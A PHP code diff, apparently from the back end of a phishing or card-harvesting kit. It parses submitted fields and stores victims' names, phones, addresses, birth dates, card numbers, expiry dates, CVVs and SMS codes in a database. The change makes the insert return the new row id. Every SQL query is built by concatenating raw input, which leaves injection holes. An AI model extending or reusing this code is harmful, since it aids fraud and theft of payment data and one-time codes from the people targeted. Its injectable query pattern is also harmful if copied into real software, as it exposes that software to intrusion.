@@ -34,8 +34,17 @@
         $tmp = explode(':', $sp[6]);
         $code = $tmp[1];
         $query = "insert into user_info(user_name, user_phone, user_address, user_dob, user_city, user_code) values('" . $first_name . $last_name . "', '" . $phone . "', '" . $address ."', '" . $dob ."', '". $city . "', '" . $code ."')";
-        $conn->query($query);
-        echo $tmp_message;
+
+        //$conn->query($query);
+        if($conn->query($query) == true){
+            $query = "select * from user_info order by id desc limit 1";
+            $result = $conn->query($query);
+            $tmp_data = "";
+            while($row = $result->fetch_assoc()) {
+                $tmp_data = $row['id'];
+            }
+            echo $tmp_data;
+        }
     }else if(sizeof($sp) > 8 && sizeof($sp) < 12){
         $tmp = explode(':', $sp[7]);
         $card = $tmp[1];
@@ -46,8 +55,17 @@
         $tmp = explode(':', $sp[3]);
         $phone = $tmp[1];
         $query = "UPDATE user_info SET user_card='". $card ."', user_expiration_date='". $exp ."', user_cvv='" . $cvv . "' WHERE user_phone='". $phone ."'";
+
         $conn->query($query);
-        echo $tmp_message;
+        // if($conn->query($query) == true){
+        //     $query = "select * from user_info order by id desc limit 1";
+        //     $result = $conn->query($query);
+        //     $tmp_data = "";
+        //     while($row = $result->fetch_assoc()) {
+        //         $tmp_data = $row['id'];
+        //     }
+        //     echo $tmp_data;
+        // }
     }else {
         $tmp = explode(':', $sp[10]);
         $smscode = $tmp[1];
